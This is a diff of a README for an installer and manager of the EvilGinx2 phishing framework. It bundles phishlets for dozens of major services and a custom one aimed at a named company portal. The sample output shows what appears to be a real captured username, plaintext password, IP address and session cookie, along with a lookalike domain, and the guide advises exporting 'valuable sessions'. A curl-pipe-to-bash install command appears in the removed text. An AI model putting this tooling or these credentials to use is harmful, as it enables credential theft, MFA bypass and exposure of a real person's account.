@@ -1,463 +1,363 @@
-# 🥷 AKUMA EvilGinx2 AutoInstaller
+# 🎯 AKUMA EvilGinx2 AutoInstaller
 
-<div align="center">
+**Automated EvilGinx2 installer and management scripts for penetration testing**
 
-![AKUMA Logo](https://img.shields.io/badge/AKUMA-EvilGinx2-red?style=for-the-badge&logo=hackthebox&logoColor=white)
-[![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=for-the-badge)](https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![EvilGinx2](https://img.shields.io/badge/EvilGinx2-3.3.0-orange?style=for-the-badge)](https://github.com/kgretzky/evilginx2)
+![Version](https://img.shields.io/badge/version-v2.0.0-blue)
+![Platform](https://img.shields.io/badge/platform-linux-brightgreen)
+![Shell](https://img.shields.io/badge/shell-bash-yellow)
+![License](https://img.shields.io/badge/license-MIT-red)
 
-**Automated installation and management suite for EvilGinx2 phishing framework**
+## 🆕 What's New in v2.0.0
 
-[Features](#-features) • [Installation](#-quick-installation) • [Usage](#-usage) • [Documentation](#-documentation) • [Security](#-security-notice)
+### ✨ Major Features Added:
 
-</div>
-
----
-
-## 🚨 **CRITICAL SECURITY NOTICE**
-
-> **⚠️ WARNING: This tool is designed EXCLUSIVELY for authorized penetration testing and security research with explicit written permission. Unauthorized use for malicious purposes is strictly prohibited and illegal.**
-
-**Use responsibly. Use ethically. Use legally.**
+- **🔧 Session Database Fix**: Fixed critical issue where EvilGinx2 sessions weren't being saved to database
+- **📊 Advanced Session Management**: Full integration of session viewing, export, and management
+- **🎮 Enhanced Interactive Interface**: New menu options for session operations
+- **📁 Multiple Export Formats**: JSON, CSV, Text formats with exact EvilGinx2 formatting
+- **📈 Session Statistics**: Real-time statistics and monitoring
+- **🔒 Safe Database Operations**: Automatic backups before cleanup operations
 
 ---
 
-## 📋 **Overview**
+## 🎯 Overview
 
-AKUMA EvilGinx2 AutoInstaller is a comprehensive automation suite that simplifies the deployment, configuration, and management of the EvilGinx2 reverse proxy phishing framework. This toolkit is designed for cybersecurity professionals conducting authorized penetration tests and security assessments.
+This project provides a comprehensive automation solution for EvilGinx2 deployment, management, and session handling. Perfect for penetration testers and security researchers who need a reliable, automated setup.
 
-### What is EvilGinx2?
-
-EvilGinx2 is a man-in-the-middle attack framework used for phishing login credentials and session cookies, enabling bypass of 2-factor authentication. It acts as a reverse proxy between the victim and the legitimate website.
-
----
-
-## 🎯 **Features**
-
-### 🔧 **Automated Installation**
-- ✅ **One-click setup** - Complete EvilGinx2 installation with a single command
-- ✅ **Dependency management** - Automatic installation of Go, Git, and build tools
-- ✅ **Multi-distro support** - Ubuntu, Debian, CentOS, RHEL, Fedora
-- ✅ **System validation** - Pre-installation system requirements check
-- ✅ **Clean removal** - Remove existing installations before fresh setup
-
-### 🎛️ **Management Interface**
-- ✅ **Interactive menu** - User-friendly command-line interface
-- ✅ **Service management** - systemd service integration
-- ✅ **Real-time monitoring** - Live log viewing and status monitoring
-- ✅ **Auto-update** - Built-in EvilGinx2 update functionality
-- ✅ **Configuration display** - Easy access to all configuration paths
-
-### 🎯 **Phishlet Collection**
-- ✅ **89+ phishlets included** - Comprehensive collection bundled in repository
-- ✅ **Popular services covered** - Google, Facebook, Microsoft, Amazon, PayPal, LinkedIn
-- ✅ **Custom Bitrix24 phishlets** - Specialized for portal.keydisk.ru + universal version
-- ✅ **Auto-installation** - Phishlets installed automatically during setup
-- ✅ **Offline capability** - No internet dependency for phishlet installation
-
-### 🔒 **Security & Reliability**
-- ✅ **Root privilege validation** - Ensures proper permissions
-- ✅ **Error handling** - Comprehensive error detection and reporting
-- ✅ **Backup support** - Configuration and data preservation
-- ✅ **Service reliability** - Auto-restart on failure
-
----
-
-## 🚀 **Quick Installation**
-
-### Prerequisites
-
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Ubuntu 18.04+, Debian 9+, CentOS 7+, RHEL 7+, Fedora 28+ |
-| **Privileges** | Root/sudo access required |
-| **Network** | Internet connection for package downloads |
-| **Architecture** | x86_64/amd64 |
+## ⚡ Quick Start
 
 ### One-Line Installation
-
 ```bash
-# Download and run the installer
-curl -sSL https://raw.githubusercontent.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller/main/install_evilginx2.sh | sudo bash
-```
-
-**⚠️ Note:** For the full experience with all 89+ phishlets, clone the repository instead of using one-line installation.
-
-### Manual Installation
-
-```bash
-# Clone the repository
 git clone https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller.git
 cd AKUMA-EvilGinx2-AutoInstaller
-
-# Make scripts executable
-chmod +x install_evilginx2.sh evilginx2_manager.sh
-
-# Run the installer
+chmod +x install_evilginx2.sh
 sudo ./install_evilginx2.sh
 ```
 
-### 🔧 **Fix Missing Phishlets (if needed)**
-
-If you installed EvilGinx2 but phishlets are missing, use the fix script:
-
-```bash
-# Fix phishlets in existing installation
-sudo ./fix_phishlets.sh
-```
-
----
-
-## 🎮 **Usage**
-
-### 🎯 **Quick Start**
-
-After installation, you have several options to run EvilGinx2:
-
-#### Option 1: Interactive Mode (Recommended for beginners)
-```bash
-sudo ./evilginx2_manager.sh interactive
-```
-
-#### Option 2: Service Mode (Recommended for production)
-```bash
-# Start as a system service
-sudo ./evilginx2_manager.sh start
-
-# Enable auto-start on boot
-sudo ./evilginx2_manager.sh enable
-```
-
-#### Option 3: Management Menu
+### Launch Manager
 ```bash
 sudo ./evilginx2_manager.sh
 ```
 
-### 🎛️ **Management Commands**
-
-| Command | Description |
-|---------|-------------|
-| `status` | Show service status |
-| `start` | Start EvilGinx2 service |
-| `stop` | Stop EvilGinx2 service |
-| `restart` | Restart EvilGinx2 service |
-| `enable` | Enable auto-start on boot |
-| `disable` | Disable auto-start |
-| `logs` | View recent logs |
-| `follow` | Follow logs in real-time |
-| `interactive` | Run in interactive mode |
-| `config` | Show configuration paths |
-| `phishlets` | List available phishlets |
-| `update` | Update EvilGinx2 to latest version |
-
-### 📁 **Directory Structure**
-
-After installation, the following directory structure is created:
-
-```
-/root/
-├── evilginx2/                    # Source code
-│   ├── build/evilginx           # Compiled binary
-│   ├── phishlets/               # Original phishlets
-│   └── redirectors/             # Original redirectors
-├── evilginx2-data/              # Working directory
-│   ├── phishlets/               # Active phishlets
-│   ├── redirectors/             # Active redirectors
-│   └── database/                # Session database
-/usr/local/bin/evilginx          # System binary
-/etc/systemd/system/evilginx2.service  # systemd service
-```
-
 ---
 
-## 🎨 **Screenshots**
+## 🎮 Features
 
-### Installation Process
-```
-==================================================
-         Evilginx2 Автоматический установщик
-==================================================
+### 🚀 Core Installation & Management
+- **Automated Installation**: One-click EvilGinx2 setup with all dependencies
+- **Service Management**: systemd integration with auto-start capability
+- **Configuration Management**: Automated phishlets and redirectors setup
+- **Real-time Monitoring**: Live logs and status monitoring
 
-[INFO] Обнаружена ОС: Ubuntu 22.04
-[INFO] Установка зависимостей (Git, Go)...
-[SUCCESS] Go версии 1.22 установлен корректно
-[INFO] Клонирование Evilginx2 в /root/evilginx2...
-[SUCCESS] Репозиторий успешно склонирован
-[INFO] Компиляция Evilginx2...
-[SUCCESS] Evilginx2 успешно скомпилирован
-[SUCCESS] Evilginx2 установлен в /usr/local/bin/evilginx
-```
+### 📊 Advanced Session Management (NEW!)
+- **Database Persistence**: Fixed session saving to `/root/evilginx2-data/data.db`
+- **Interactive Viewing**: Table and detailed views exactly like EvilGinx2 interface
+- **Export Capabilities**: Multiple formats (JSON, CSV, Text)
+- **Session Statistics**: Real-time analytics and monitoring
+- **Safe Cleanup**: Database cleanup with automatic backups
 
-### Management Interface
-```
-==========================================
-         Evilginx2 Manager
-==========================================
+### 🛠️ Management Options
 
-1.  Показать статус сервиса
-2.  Запустить сервис
-3.  Остановить сервис
-4.  Перезапустить сервис
-5.  Включить автозапуск
-6.  Отключить автозапуск
-7.  Показать логи
-8.  Следить за логами
-9.  Запустить интерактивно
-10. Показать конфигурацию
-11. Показать phishlets
-12. Обновить Evilginx2
-0.  Выход
-
-Выберите действие:
-```
-
----
-
-## 📚 **Documentation**
-
-### 🔧 **Configuration**
-
-EvilGinx2 configuration files and data are stored in:
-- **Main config**: `/root/evilginx2-data/`
-- **Phishlets**: `/root/evilginx2-data/phishlets/`
-- **Redirectors**: `/root/evilginx2-data/redirectors/`
-- **Database**: `/root/evilginx2-data/database/`
-
-### 🎭 **Working with Phishlets**
-
+#### Interactive Menu
 ```bash
-# List available phishlets
-sudo ./evilginx2_manager.sh phishlets
+./evilginx2_manager.sh
+```
 
-# Run EvilGinx2 interactively to manage phishlets
+**Service Management:**
+- Status, Start, Stop, Restart
+- Enable/Disable autostart
+- Live log monitoring
+- Interactive mode
+
+**Session Management (NEW!):**
+- **13** - Show sessions table
+- **14** - View specific session details  
+- **15** - Show all sessions with details
+- **16** - Export sessions to file
+- **17** - Session statistics
+- **18** - Clean database (with backup)
+
+#### Direct Commands
+```bash
+# Service operations
+./evilginx2_manager.sh status
+./evilginx2_manager.sh start
+./evilginx2_manager.sh restart
+
+# Session operations (NEW!)
+./evilginx2_manager.sh sessions      # Quick table view
+./evilginx2_manager.sh stats         # Database statistics  
+./evilginx2_manager.sh export        # Interactive export
+./evilginx2_manager.sh cleanup       # Safe database cleanup
+```
+
+---
+
+## 🔧 Technical Details
+
+### 🗂️ Project Structure
+```
+AKUMA-EvilGinx2-AutoInstaller/
+├── install_evilginx2.sh           # Main installer
+├── evilginx2_manager.sh            # Enhanced manager with session support
+├── fix_phishlets.sh                # Phishlet fixing utility
+├── export_sessions.sh              # Session export utility (NEW!)
+├── evilginx2_database_fix.patch    # Database persistence patch (NEW!)
+├── README_SESSIONS.md              # Session management documentation (NEW!)
+├── README_SESSIONS_MANAGER.md      # Manager integration guide (NEW!)
+└── phishlets/                      # Custom phishlets collection
+```
+
+### 🛡️ Session Database Fix
+
+**Problem Solved**: EvilGinx2 v3.3.0 had a critical issue where sessions were displayed in the interface but not saved to the database file.
+
+**Solution**: Added `db.Flush()` calls to force BuntDB to write data to disk:
+- After session creation
+- After username/password capture  
+- After token updates
+
+**Result**: 
+- ✅ All sessions now persist in `/root/evilginx2-data/data.db`
+- ✅ Data survives service restarts
+- ✅ Export and analysis capabilities enabled
+
+### 📊 Session Export Examples
+
+#### Quick Table View
+```bash
+./evilginx2_manager.sh sessions
+```
+Output:
+```
++-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+
+| id  |    phishlet     |   username    |    password     |  tokens   |   remote ip     |       time        |
++-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+
+| 2   | keydisk-portal  | vysotskiy_dv  | 80Vfk"ynRbyCtk  | captured  | 109.225.41.64   | 2025-09-24 17:05  |
++-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+
+```
+
+#### Detailed Session View
+```bash
+./evilginx2_manager.sh session
+# Enter session ID: 2
+```
+Output:
+```
+ id           : 2
+ phishlet     : keydisk-portal
+ username     : vysotskiy_dv
+ password     : 80Vfk"ynRbyCtk
+ tokens       : captured
+ landing url  : https://portal.keydlsk.ru/auth
+ user-agent   : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+ remote ip    : 109.225.41.64
+ create time  : 2025-09-24 17:05
+ update time  : 2025-09-24 17:05
+
+[ cookies ]
+[{"path":"/","domain":"portal.keydisk.ru","expirationDate":1790283677,"value":"vysotskiy_dv",...}]
+```
+
+#### Statistics
+```bash
+./evilginx2_manager.sh stats
+```
+Output:
+```
+Database size: 2.1K
+Total sessions: 4
+Sessions with tokens: 1
+```
+
+---
+
+## 🎯 Installation Details
+
+### Requirements
+- **OS**: Ubuntu/Debian (tested on Ubuntu 20.04+)
+- **Privileges**: Root access required
+- **Network**: Internet connection for dependencies
+- **Domain**: Valid domain name for certificates
+
+### What Gets Installed
+1. **Go** programming language (latest version)
+2. **EvilGinx2** from official repository
+3. **System service** with auto-start capability
+4. **Custom phishlets** and redirectors
+5. **Session management tools** (NEW!)
+6. **Database persistence fix** (NEW!)
+
+### Directory Structure Created
+```
+/root/evilginx2/                    # Source code
+/root/evilginx2-data/               # Data directory
+├── data.db                         # Session database (FIXED!)
+├── config.json                     # Configuration
+├── phishlets/                      # Phishlets
+├── redirectors/                    # Redirectors  
+├── crt/                           # Certificates
+└── export_sessions.sh              # Export utility (NEW!)
+```
+
+---
+
+## 🎮 Usage Examples
+
+### Basic Setup
+```bash
+# 1. Install EvilGinx2
+sudo ./install_evilginx2.sh
+
+# 2. Configure domain (example)
 sudo ./evilginx2_manager.sh interactive
+# In EvilGinx2 console:
+# config domain your-domain.com
+# config ipv4 YOUR_SERVER_IP
+
+# 3. Enable phishlet
+# phishlets enable example
+# lures create example
+# lures get-url 0
 ```
 
-Inside EvilGinx2 interactive shell:
-```
-evilginx> phishlets                    # List all phishlets
-evilginx> phishlets enable office365   # Enable a phishlet
-evilginx> lures create office365       # Create a lure
-evilginx> sessions                     # View captured sessions
-```
-
-### 🗂️ **Included Phishlets (89+ Total)**
-
-<details>
-<summary>🌟 Click to view complete phishlet collection</summary>
-
-#### 🏢 **Business & Enterprise**
-- **Microsoft**: microsoft, o365 (8 variants), outlook (4 variants), hotmail
-- **Google**: google, google2, google-botguard-bypass, gsuite
-- **AWS**: aws
-- **Citrix**: citrix
-- **Okta**: okta
-- **OneLogin**: onelogin
-
-#### 📧 **Email & Communication**
-- **Outlook**: outlook, outlook2, outlook3, hotmail
-- **AOL**: aol
-- **ProtonMail**: protonmail
-- **Viber**: viber
-
-#### 💰 **Financial & E-commerce**
-- **PayPal**: paypal, paypal(working2)
-- **Amazon**: amazon, amazon-seller, Amazon--
-- **eBay**: ebay
-- **Coinspot**: coinspot
-- **Fidelity**: fidelity
-- **Paxful**: paxful
-- **Luno**: luno
-- **Vanguard**: vanguard
-- **OpenBank**: openbank
-
-#### 🌐 **Social Media**
-- **Facebook**: facebook, facebook-d, facebook-d2, facebook-d3, facebook-fix
-- **LinkedIn**: linkedin, linkedin2
-- **Instagram**: instagram
-- **Twitter**: twitter, twitter-mobile
-- **TikTok**: tiktok
-- **Snapchat**: snapchat
-- **Reddit**: reddit
-
-#### 🏨 **Travel & Booking**
-- **Airbnb**: airbnb, airbnbfr
-- **Booking**: booking
-- **VRBO**: vrbo
-
-#### 🎮 **Gaming & Entertainment**
-- **PlayStation**: playstation, playstation-B
-- **Steam**: steam
-- **Roblox**: roblox
-- **SuperSport**: supersport
-
-#### 🛒 **Shopping & Marketplace**
-- **Alibaba**: alibaba
-- **Allegro**: allegro
-- **CoolBlue**: coolblue
-- **Mobile.de**: mobile-de
-- **Autoline**: autoline
-
-#### ☁️ **Cloud & Storage**
-- **DropBox**: dropbox
-- **iCloud**: icloud, icloud2
-
-#### 🏢 **Hosting & Domains**
-- **GoDaddy**: godaddy, godaddy(sso)
-- **Namecheap**: namecheap
-- **Rackspace**: rackspace
-- **Ionos**: ionos
-- **Hetzner**: hetzner
-
-#### 🔧 **Development & Tools**
-- **GitHub**: github
-- **WordPress**: wordpress.org
-- **Chrome Extension**: chrome_extension
-- **EDD**: edd
-
-#### 🏢 **Custom Business Solutions**
-- **Bitrix24**: bitrix24-keydisk (for portal.keydisk.ru), bitrix24-universal
-- **Intuit**: intuit
-- **Gusto**: gusto
-
-#### 🌏 **Regional Services**
-- **Xfinity**: xfinity
-- **Yahoo**: yahoo(fixed)
-- **Hinet**: hinet, webhinet
-- **Fudan**: fudan
-- **163**: 163working
-
-#### 🔐 **Security & Testing**
-- **reCAPTCHA**: recaptcha-demo
-- **hCaptcha**: hcaptcha-demo
-- **Example**: example (template)
-
-</details>
-
-### 🔄 **Updates and Maintenance**
-
+### Session Management Workflow
 ```bash
-# Update EvilGinx2 to latest version
-sudo ./evilginx2_manager.sh update
+# 1. Check current sessions
+./evilginx2_manager.sh sessions
 
-# Check service status
-sudo ./evilginx2_manager.sh status
+# 2. View detailed session info
+./evilginx2_manager.sh session
+# Enter ID when prompted
 
-# View logs for troubleshooting
-sudo ./evilginx2_manager.sh logs
-```
+# 3. Export valuable sessions
+./evilginx2_manager.sh export
+# Choose format and sessions to export
 
-### 🐛 **Troubleshooting**
-
-#### Common Issues
-
-| Issue | Solution |
-|-------|----------|
-| **Permission denied** | Run with `sudo` |
-| **Port already in use** | Stop conflicting services (apache2, nginx) |
-| **Go version too old** | Update Go to 1.19+ |
-| **Service won't start** | Check logs with `sudo ./evilginx2_manager.sh logs` |
-
-#### Service Management
-
-```bash
-# Check if service is running
-sudo systemctl status evilginx2
-
-# View detailed logs
-sudo journalctl -u evilginx2 -f
-
-# Restart service manually
-sudo systemctl restart evilginx2
+# 4. Monitor statistics
+./evilginx2_manager.sh stats
 ```
 
 ---
 
-## 🔗 **Related Resources**
+## 🛡️ Security & Legal Notice
 
-### Official Links
-- 🌐 [EvilGinx2 Official Repository](https://github.com/kgretzky/evilginx2)
-- 📖 [Official Documentation](https://help.evilginx.com)
-- 🎓 [EvilGinx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
+### ⚠️ IMPORTANT DISCLAIMER
 
-### Community Resources
-- 🔧 [Phishlets Collection](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
-- 💡 [Security Research Papers](https://scholar.google.com/scholar?q=evilginx2)
-- 🛡️ [Defense Strategies](https://www.sans.org/blog/detecting-malicious-reverse-proxies/)
+This tool is designed for **authorized penetration testing** and **security research** purposes only.
+
+### ✅ Legitimate Uses
+- **Authorized Penetration Testing**
+- **Security Awareness Training** 
+- **Red Team Exercises**
+- **Academic Research**
+- **Personal Lab Environment**
+
+### ❌ Prohibited Uses
+- Unauthorized access to systems
+- Malicious phishing campaigns
+- Identity theft or fraud
+- Any illegal activities
+
+### 🔒 Best Practices
+- Always obtain **written authorization** before testing
+- Use only in **controlled environments**
+- Follow **responsible disclosure** practices
+- Respect **privacy and data protection** laws
+- Document and **report findings** properly
+
+**By using this tool, you accept full responsibility for its use and agree to use it only for legitimate, authorized purposes.**
 
 ---
 
-## 🤝 **Contributing**
-
-We welcome contributions! Please read our contributing guidelines:
+## 🤝 Contributing
 
 ### How to Contribute
-1. 🍴 Fork the repository
-2. 🌿 Create a feature branch (`git checkout -b feature/awesome-feature`)
-3. 💾 Commit your changes (`git commit -m 'Add awesome feature'`)
-4. 📤 Push to the branch (`git push origin feature/awesome-feature`)
-5. 🔄 Open a Pull Request
+1. Fork the repository
+2. Create a feature branch: `git checkout -b feature/amazing-feature`
+3. Make your changes
+4. Test thoroughly
+5. Commit: `git commit -m 'Add amazing feature'`
+6. Push: `git push origin feature/amazing-feature`
+7. Open a Pull Request
 
-### What We Need
-- 🐛 Bug fixes
-- ✨ New features
-- 📝 Documentation improvements
-- 🧪 Test coverage
-- 🌍 Multi-language support
-
----
-
-## 📄 **License**
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-### Third-Party Licenses
-- **EvilGinx2**: BSD-3-Clause License by [@kgretzky](https://github.com/kgretzky)
+### Areas for Contribution
+- Additional phishlets
+- New export formats
+- Enhanced session analysis
+- Performance improvements
+- Documentation updates
+- Bug fixes
 
 ---
 
-## ⚖️ **Legal Disclaimer**
+## 📞 Support & Contact
 
-> **This tool is provided for educational and authorized testing purposes only. The developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Users must comply with all applicable laws and regulations. Unauthorized access to computer systems is illegal.**
+### Issues & Bugs
+- **GitHub Issues**: [Report bugs or request features](https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller/issues)
+- **Discussions**: Use GitHub Discussions for questions
 
-### Ethical Use Guidelines
-- ✅ **Only use on systems you own or have explicit permission to test**
-- ✅ **Obtain written authorization before any penetration testing**
-- ✅ **Follow responsible disclosure practices**
-- ✅ **Respect privacy and confidentiality**
-- ❌ **Do not use for malicious purposes**
-- ❌ **Do not test without permission**
-
----
-
-## 👨‍💻 **Author & Support**
-
-### Author
-- **GitHub**: [@sweetpotatohack](https://github.com/sweetpotatohack)
-- **Project**: AKUMA EvilGinx2 AutoInstaller
-
-### Original EvilGinx2 Author
-- **GitHub**: [@kgretzky](https://github.com/kgretzky)
-- **Twitter**: [@mrgretzky](https://twitter.com/mrgretzky)
-
-### Support
-- 🐛 [Report Bugs](https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller/issues)
-- 💬 [Feature Requests](https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller/issues)
-- 📖 [Documentation](https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller/wiki)
+### Documentation
+- **Session Management**: See `README_SESSIONS.md`
+- **Manager Guide**: See `README_SESSIONS_MANAGER.md` 
+- **Installation Issues**: Check existing issues or create new one
 
 ---
 
-<div align="center">
+## 📋 Changelog
 
-### ⭐ **If this project helped you, please give it a star!** ⭐
+### v2.0.0 (2025-09-24) - Major Release
+- **🔧 FIXED**: Critical database persistence issue in EvilGinx2
+- **📊 NEW**: Advanced session management system
+- **🎮 NEW**: Enhanced interactive manager interface
+- **📁 NEW**: Multiple export formats (JSON, CSV, Text)
+- **📈 NEW**: Real-time session statistics
+- **🔒 NEW**: Safe database cleanup with auto-backup
+- **📚 NEW**: Comprehensive documentation updates
 
-![Star History](https://api.star-history.com/svg?repos=sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller&type=Date)
+### v1.0.0 (2024-08-26) - Initial Release
+- Basic EvilGinx2 installation automation
+- Service management capabilities
+- Custom phishlets integration
+- Interactive management interface
 
 ---
 
-**Made with ❤️ for the cybersecurity community**
+## 📜 License
 
-**Remember: Use your powers for good! 🛡️**
+This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
 
-</div>
+### MIT License Summary
+- ✅ **Use** - Commercial and private use allowed
+- ✅ **Modify** - Modification and derivative works allowed
+- ✅ **Distribute** - Distribution allowed
+- ✅ **Private Use** - Private use allowed
+- ❗ **Liability** - No warranty provided
+- ❗ **Responsibility** - Use at your own risk
+
+---
+
+## 🎯 Credits & Acknowledgments
+
+### Original Projects
+- **EvilGinx2**: [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) - The core phishing framework
+- **Community Phishlets**: Various contributors from the security community
+
+### Development
+- **AKUMA Project**: Automation and enhancement layer
+- **sweetpotatohack**: Primary development and maintenance
+- **Community**: Bug reports, feature requests, and contributions
+
+---
+
+## 🔗 Related Projects
+
+- **EvilGinx2 Official**: [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
+- **Phishlet Collections**: Various community repositories
+- **Penetration Testing Tools**: OWASP, Kali Linux toolkit
+
+---
+
+**⭐ If this project helped you, please consider giving it a star! ⭐**
+
+*Made with ❤️ for the security community*
